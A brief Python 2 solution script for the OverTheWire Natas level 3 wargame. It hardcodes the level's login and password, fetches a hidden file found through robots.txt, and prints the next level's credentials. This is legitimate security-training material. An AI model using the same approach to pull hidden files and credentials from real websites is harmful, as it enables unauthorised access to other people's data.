# Natas3 python solution
# By Emil 'Dota' Bak, 2019

import requests

# ***********************************************
URL = "http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt"

auth_name = 'natas3'
auth_pass = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'
# ***********************************************

# A commen hints that 'google cannot find it'.
# A webcrawler would always check for a 'robots.txt' file.
# This file indicates of a hidden folder named 's3cr3t'
r = requests.get(URL, auth=(auth_name, auth_pass))

for x in r.iter_lines():
    if "natas4" in x:
        print x